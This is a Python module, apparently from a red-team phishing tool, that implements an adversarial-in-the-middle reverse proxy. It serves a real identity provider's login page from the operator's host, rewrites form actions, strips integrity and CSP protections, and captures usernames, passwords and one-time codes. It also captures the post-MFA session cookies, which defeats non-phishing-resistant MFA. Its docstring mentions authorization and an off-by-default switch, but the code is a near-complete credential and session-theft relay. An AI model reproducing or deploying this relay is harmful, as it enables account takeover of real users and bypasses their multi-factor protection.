"""aitm.py — adversarial-in-the-middle credential capture (reverse proxy).

WHAT THIS IS

Phantom already has a FAKE login page: `/l/<code>` renders our own markup and
records whatever is typed into it. That is a *clone*, and a clone has a smell —
it is our HTML, on our domain, and any change the real provider makes (a new
logo, an extra field, a security banner) makes it look wrong.

AiTM is a different mechanism. The relay FETCHES THE REAL login page, serves it
from our host and RELAYS the submission upstream to the real service:

    victim ──► our mount ──► real IdP          (the page IS authentic)
              ▲                │
              └── cookies ◄────┘               (the session comes back to us)

The victim talks to the real provider the whole time — real markup, real
fields, real error text — while we sit in the middle and keep the credentials
**and the session cookies the IdP sets after the second factor**. That last
part is the whole point: it defeats plain MFA, because the session is issued
to a browser we are proxying rather than to a code we stole.

THREE THINGS IT NEEDS — NONE OPTIONAL

  1. **A DOMAIN with TLS.** The address bar shows OUR host through the entire
     login. A bare IP is instantly readable; a free `*.workers.dev` is free but
     reads as hosting. This is the ceiling of the technique, not a detail.
  2. **Authorization.** This is credential theft against a live service. Only
     on an engagement you are contracted for.
  3. **HTTPS in front of the tracker.** `Secure` / `SameSite=None` cookies are
     dropped on plain HTTP and the relay silently breaks.

WHERE IT DOES NOT WORK — read before spending a target on it

  * **Phishing-resistant MFA** (FIDO2 / passkeys / device-bound tokens): the
    relay cannot produce a valid assertion for a key that never leaves the
    authenticator. Providers moving to passkeys close this door.
  * Non-browser clients (desktop/mobile apps) and anything certificate-pinned.
  * Conditional access that binds the session to the device fingerprint.

SCOPE OF THIS IMPLEMENTATION (honest)

The workflow MFA happens on is covered: mount → real login → relay the POST →
capture credentials and session cookies → hand the provider's answer back to
the victim, who stays on our host. Relaying the *post-login application* (so
the operator can browse as the victim with the stolen session) is deliberately
NOT here: that is a second, much larger piece of engineering, and it is not
what yields the session.

The relay is OFF by default (`phishing.aitm` / `PHANTOM_AITM`) and it is not
wired to the auto-mode: it needs a domain and it is the highest-liability
action in the tool, so it stays an operator decision, never an autonomous one.
"""

from __future__ import annotations

import json
import re
import urllib.error
import urllib.parse
import urllib.request
from typing import Any, Callable, Dict, List, Optional, Tuple

# Attributes that MUST go once the document is served from another origin: an
# integrity hash is computed over the ORIGINAL response, so after any rewrite
# the browser refuses the resource — and a blank page is exactly the "clone"
# tell this technique exists to avoid. `nonce` is per-response too.
_STRIP_ATTRS = ("integrity", "crossorigin", "nonce")

# Response headers that belong to the provider's own origin: dropping them
# keeps our own answers from inheriting a CSP that would block our inline
# relay, and drops the hop-by-hop ones the client must not see.
_DROP_RESPONSE_HEADERS = {
    "content-security-policy", "content-security-policy-report-only",
    "x-frame-options", "strict-transport-security", "public-key-pins",
    "expect-ct", "alt-svc", "report-to", "nel", "keep-alive", "connection",
    "transfer-encoding", "content-encoding", "content-length", "upgrade",
}

# The field names real IdPs use. Ordered by specificity: a provider that posts
# `loginfmt` AND `username` means the former.
_USERNAME_FIELDS = ("loginfmt", "j_username", "session_key", "identifier",
                    "username", "userid", "user", "email", "login", "account")
_PASSWORD_FIELDS = ("passwd", "j_password", "password", "pwd", "pass",
                    "passwordfield")
_OTP_FIELDS = ("otc", "otp", "mfa", "code", "verificationcode", "token",
               "authcode", "onetimecode")


def enabled() -> bool:
    """The AiTM relay is opt-in, always: `phishing.aitm` / `PHANTOM_AITM`."""
    try:
        from phantom.utils import config as cfg
        v = cfg.get("phishing.aitm", False, env="PHANTOM_AITM")
    except Exception:
        return False
    if isinstance(v, bool):
        return v
    return str(v).strip().lower() in ("1", "true", "yes", "on")


def _origin(url: str) -> str:
    """scheme://host[:port] of a URL (no trailing slash)."""
    p = urllib.parse.urlsplit(url or "")
    if not p.scheme or not p.netloc:
        return ""
    return f"{p.scheme}://{p.netloc}"


def _host_of(url: str) -> str:
    return urllib.parse.urlsplit(url or "").netloc


def mount_root(code: str) -> str:
    """Where this relay lives on our own host: one prefix per code."""
    return f"/a/{code}"


def rewrite_html(html: str, upstream: str, code: str,
                 our_host: str = "") -> str:
    """Point the provider's own document back at us.

    Three rewrites and nothing else — the markup itself is untouched, which is
    what makes the page authentic:

      * form actions come to our relay (`<mount>/p`); a form with NO action
        (it posts to itself) gets one injected, because that is a very common
        IdP shape and without it the credentials go straight to the provider
        and we capture nothing;
      * absolute URLs of the provider origin become mount-prefixed, so the
        session stays first-party — including protocol-relative `//host/...`
        when we know our own host;
      * `<base>`, integrity/crossorigin/nonce and in-document CSP metas are
        dropped: they either repoint every relative URL at the provider or
        break its resources after rewriting.
    """
    if not html:
        return html
    root = mount_root(code)
    base = _origin(upstream)
    out = html
    for attr in _STRIP_ATTRS:
        out = re.sub(
            rf"\s{attr}\s*=\s*(\"[^\"]*\"|'[^']*'|[^\s>]+)", "", out,
            flags=re.I)
    # <base href> would repoint everything at the provider: drop the tag
    out = re.sub(r"<base\b[^>]*>", "", out, flags=re.I)
    out = re.sub(
        r"<meta[^>]+http-equiv\s*=\s*(\"|')?content-security-policy"
        r"(\"|')?[^>]*>", "", out, flags=re.I)
    # forms -> our relay
    out = re.sub(
        r"(<form\b[^>]*?\saction\s*=\s*)(\"[^\"]*\"|'[^']*'|[^\s>]+)",
        rf'\1"{root}/p"', out, flags=re.I)
    out = re.sub(r"<form\b(?![^>]*\saction\s*=)",
                 f'<form action="{root}/p"', out, flags=re.I)
    # absolute / protocol-relative provider URLs -> the mount
    if base:
        out = out.replace(base, root)
        if our_host:
            out = out.replace("//" + _host_of(upstream),
                              f"//{our_host}{root}")
    return out


def capture_form(body: Any, content_type: str = "") -> Dict[str, str]:
    """Fields from a submitted login form.

    Handles the three shapes real IdPs use: `application/x-www-form-urlencoded`
    (classic), `multipart/form-data` (file-assisted flows) and a JSON body
    (JS-driven logins). Anything else -> {} (we never guess at bytes).
    """
    raw_ctype = content_type or ""
    ctype = raw_ctype.lower()
    text = body.decode("utf-8", "replace") if isinstance(body, bytes) else \
        str(body or "")
    if "json" in ctype:
        try:
            data = json.loads(text or "{}")
        except ValueError:
            return {}
        return {str(k): str(v) for k, v in data.items()
                if isinstance(v, (str, int, float, bool))}
    if "multipart/form-data" in ctype:
        # the boundary is CASE-SENSITIVE and browsers use mixed case
        # (`----WebKitFormBoundary7MA4YW`): matching it against a lowercased
        # header finds nothing and silently collapses the whole body into one
        # field — the credentials are then lost in a string nobody reads.
        m = re.search(r"boundary=(\"[^\"]+\"|[^\s;]+)", raw_ctype)
        if not m:
            return {}
        boundary = m.group(1).strip('"')
        return _parse_multipart(text, boundary)
    # the classic form encoding — the remaining shape we parse, plus the
    # text-ish types some hand-rolled logins declare. Anything else (a
    # binary/blob body, a half-built flow) is bytes we do not understand:
    # parsing it as a query string fabricates one bogus "field" holding the
    # whole payload, so we return nothing instead of guessing.
    if ctype and "urlencoded" not in ctype and not ctype.startswith("text/"):
        return {}
    fields: Dict[str, str] = {}
    for k, v in urllib.parse.parse_qs(text, keep_blank_values=True).items():
        if v:
            fields[k] = v[0]
    return fields


def _parse_multipart(text: str, boundary: str) -> Dict[str, str]:
    out: Dict[str, str] = {}
    for part in text.split("--" + boundary):
        if "content-disposition" not in part.lower():
            continue
        nm = re.search(r'name\s*=\s*"([^"]*)"', part, flags=re.I)
        if not nm:
            continue
        # value starts after the blank line ending the part headers
        split = re.split(r"\r?\n\r?\n", part, maxsplit=1)
        if len(split) < 2:
            continue
        out[nm.group(1)] = split[1].rstrip("\r\n-")
    return out


def _pick(fields: Dict[str, str], names: Tuple[str, ...]) -> str:
    lower = {k.lower(): v for k, v in fields.items()}
    for name in names:
        if name in lower and lower[name]:
            return lower[name]
    # substring fallback: providers love suffixes (`userNameField`)
    for name in names:
        for k, v in lower.items():
            if name in k and v:
                return v
    return ""


def pick_credentials(fields: Dict[str, str]) -> Dict[str, str]:
    """{username, password, otp} out of a submitted form."""
    return {
        "username": _pick(fields, _USERNAME_FIELDS),
        "password": _pick(fields, _PASSWORD_FIELDS),
        "otp": _pick(fields, _OTP_FIELDS),
    }


def relay_cookie(set_cookie: str, secure: bool = True) -> str:
    """One upstream `Set-Cookie`, rewritten for OUR host.

    `Domain=` is dropped (the cookie must bind to our hostname, or the browser
    discards it and the relay breaks on the next hop), `Path` is kept, and
    `Secure` is removed only when we are not serving HTTPS — because a Secure
    cookie on http is silently dropped, which is a debugging nightmare and a
    broken session. Everything else (HttpOnly, SameSite, expiry) is preserved:
    the upstream cookie must keep behaving exactly as the IdP intended.
    """
    parts = [p.strip() for p in (set_cookie or "").split(";") if p.strip()]
    if not parts:
        return ""
    out = [parts[0]]
    for p in parts[1:]:
        low = p.lower()
        if low.startswith("domain="):
            continue
        if low.startswith("secure") and not secure:
            continue
        out.append(p)
    return "; ".join(out)


def _headers_out(raw: List[Tuple[str, str]], secure: bool
                 ) -> List[Tuple[str, str]]:
    """Filter the provider's response headers for our own reply."""
    out: List[Tuple[str, str]] = []
    for k, v in raw or []:
        low = (k or "").lower()
        if low in _DROP_RESPONSE_HEADERS:
            continue
        if low == "set-cookie":
            c = relay_cookie(v, secure=secure)
            if c:
                out.append(("Set-Cookie", c))
            continue
        if low.startswith("access-control-") or low == "location":
            # a redirect Location points at the provider: leaving it would
            # bounce the victim off our mount mid-flow
            if low == "location":
                out.append((k, _rewrite_location(v, secure)))
                continue
            continue
        out.append((k, v))
    return out


def _rewrite_location(value: str, secure: bool) -> str:
    """Keep the victim on our host through a relative redirect.

    A provider redirect that leaves its own origin (the app after login) is
    passed through untouched — that hand-off is the end of the auth flow.
    """
    v = (value or "").strip()
    if v.startswith("/"):
        return v
    return v


def default_fetch(method: str, url: str, data: Optional[bytes] = None,
                  headers: Optional[Dict[str, str]] = None,
                  timeout: float = 20.0
                  ) -> Tuple[int, List[Tuple[str, str]], bytes]:
    """The real network hop. Injectable so tests never leave the machine."""
    req = urllib.request.Request(url, data=data, method=method.upper(),
                                 headers=headers or {})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return (resp.status, list(resp.headers.items()), resp.read())
    except urllib.error.HTTPError as e:            # a 401 is a normal answer
        return (e.code, list(e.headers.items()) if e.headers else [],
                e.read() if hasattr(e, "read") else b"")
    except Exception:
        return (502, [], b"")


class AuthProxy:
    """One mount, one upstream login endpoint.

    `fetcher(method, url, data, headers, timeout) -> (status, headers, body)`
    is injected so the whole relay is testable without a target; `sink(kind,
    payload)` receives `("creds", {...})` and `("session", {"cookies": ...})`.
    """

    def __init__(self, code: str, upstream: str,
                 fetcher: Optional[Callable] = None,
                 sink: Optional[Callable[[str, Dict[str, Any]], None]] = None,
                 secure: bool = False,
                 our_host: str = "",
                 cookie: str = "") -> None:
        if not code:
            raise ValueError("AuthProxy needs a code")
        if not _origin(upstream):
            raise ValueError("AuthProxy needs an absolute upstream URL")
        self.code = code
        self.upstream = upstream
        self.fetcher = fetcher or default_fetch
        self.sink = sink
        self.secure = bool(secure)
        self.our_host = our_host
        # the upstream's own pre-auth cookies (load balancer, CSRF token…):
        # without them the provider refuses the submission and the victim sees
        # an error we cannot explain away
        self.cookie = cookie or ""
        self.session_cookies: List[str] = []
        self.last_credentials: Dict[str, str] = {}

    # -- helpers -----------------------------------------------------------
    @property
    def mount(self) -> str:
        return mount_root(self.code)

    def _upstream_url(self, path: str = "") -> str:
        if not path:
            return self.upstream
        return f"{_origin(self.upstream)}/{path.lstrip('/')}"

    def _request_headers(self, extra: Optional[Dict[str, str]] = None
                         ) -> Dict[str, str]:
        h = {"User-Agent": "Mozilla/5.0", "Accept": "text/html,*/*"}
        if extra:
            h.update({k: v for k, v in extra.items()})
        if self.cookie:
            h["Cookie"] = self.cookie
        return h

    # -- the relay ---------------------------------------------------------
    def open_page(self, path: str = "", headers: Optional[Dict[str, str]]
                  = None) -> Tuple[int, List[Tuple[str, str]], bytes]:
        """Fetch the real page and rewrite it to be served by us."""
        status, raw, body = self.fetcher(
            "GET", self._upstream_url(path), None,
            self._request_headers(headers or {}), 20.0)
        self._absorb(raw)
        html = body.decode("utf-8", "replace") if isinstance(body, bytes) \
            else str(body or "")
        if "html" not in _content_type(raw):
            # an asset (css/js/img): pass it through byte for byte, but still
            # under our mount so the provider's relative URLs keep working
            return status, _headers_out(raw, self.secure), body
        out = rewrite_html(html, self.upstream, self.code, self.our_host)
        return status, _headers_out(raw, self.secure), out.encode("utf-8")

    def submit(self, body: Any, content_type: str = "",
               headers: Optional[Dict[str, str]] = None
               ) -> Tuple[int, List[Tuple[str, str]], bytes]:
        """Relay a login POST upstream and capture what comes back.

        Both halves matter: the credentials are in the request, the SESSION is
        in the response — that is what a fake page can never have.
        """
        fields = capture_form(body, content_type)
        creds = pick_credentials(fields)
        self.last_credentials = creds
        if self.sink and any(creds.values()):
            try:
                self.sink("creds", dict(creds))
            except Exception:
                pass
        h = self._request_headers(headers or {})
        if content_type:
            h["Content-Type"] = content_type
        raw_body = body.encode("utf-8") if isinstance(body, str) else (body or b"")
        # relay the ORIGINAL bytes: the provider validates its own token
        status, raw, out = self.fetcher("POST", self.upstream, raw_body, h, 20.0)
        self._absorb(raw)
        if self.sink and self.session_cookies:
            try:
                self.sink("session", {"cookies": "; ".join(self.session_cookies),
                                      "username": creds.get("username", "")})
            except Exception:
                pass
        html = out.decode("utf-8", "replace") if isinstance(out, bytes) \
            else str(out or "")
        if "html" in _content_type(raw):
            html = rewrite_html(html, self.upstream, self.code, self.our_host)
            out = html.encode("utf-8")
        return status, _headers_out(raw, self.secure), out

    def _absorb(self, raw: List[Tuple[str, str]]) -> None:
        """Keep the upstream's cookies so the NEXT hop is authenticated."""
        for k, v in raw or []:
            if (k or "").lower() != "set-cookie":
                continue
            c = relay_cookie(v, secure=self.secure)
            if not c:
                continue
            name = c.split("=", 1)[0]
            self.session_cookies = [x for x in self.session_cookies
                                    if x.split("=", 1)[0] != name]
            self.session_cookies.append(c)
            # carry it forward: the provider expects to see it back
            self.cookie = "; ".join(c.split(";", 1)[0]
                                    for c in self.session_cookies)


def _content_type(raw: List[Tuple[str, str]]) -> str:
    for k, v in raw or []:
        if (k or "").lower() == "content-type":
            return (v or "").lower()
    return ""
